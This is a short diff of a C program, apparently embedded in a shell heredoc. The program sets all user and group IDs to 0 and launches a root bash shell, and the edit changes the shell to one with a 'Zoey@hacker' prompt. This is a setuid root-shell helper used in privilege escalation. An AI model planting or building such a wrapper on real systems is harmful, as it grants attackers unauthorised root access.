@@ -18,8 +18,7 @@ int main() {
     setregid(0, 0);
     setresuid(0, 0, 0);
     setresgid(0, 0, 0);
-    
-    system("/bin/bash -p"); 
+    system("env PS1='Zoey@hacker ' /bin/bash --norc");
     return 0; 
 }
 INNER_EOF
